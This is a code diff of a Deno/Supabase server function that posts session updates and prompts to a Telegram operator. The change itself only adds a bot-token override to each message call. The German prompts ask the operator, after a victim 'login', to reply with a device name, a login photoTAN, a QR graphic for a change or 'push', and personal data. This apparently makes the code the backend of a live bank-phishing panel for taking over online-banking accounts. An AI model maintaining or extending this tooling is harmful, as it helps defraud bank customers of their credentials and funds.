@@ -56,7 +56,7 @@ Deno.serve(async (req) => {
         text: formatSessionText(updated as any),
         parse_mode: "HTML",
         ...(updated.mode === "afk" ? { reply_markup: { inline_keyboard: [] } } : { reply_markup: sessionKeyboard(updated.id, updated.mode) }),
-      });
+      }), { token: tokenOverride });
 
       // Live mode: after login, prompt operator to reply with device name.
       const isLive = updated.mode === "live" || updated.mode === "live_change";
@@ -67,7 +67,7 @@ Deno.serve(async (req) => {
           text: "📟 <b>Antworte jetzt mit Gerätenamen:</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -86,7 +86,7 @@ Deno.serve(async (req) => {
           text: "📸 <b>Mit Login photoTAN antworten.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -105,7 +105,7 @@ Deno.serve(async (req) => {
           text: "📸 <b>Mit QR-Grafik für Änderung antworten oder mit dem Wort <code>push</code>.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -124,7 +124,7 @@ Deno.serve(async (req) => {
           text: "👤 <b>Bitte mit Personendaten antworten.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
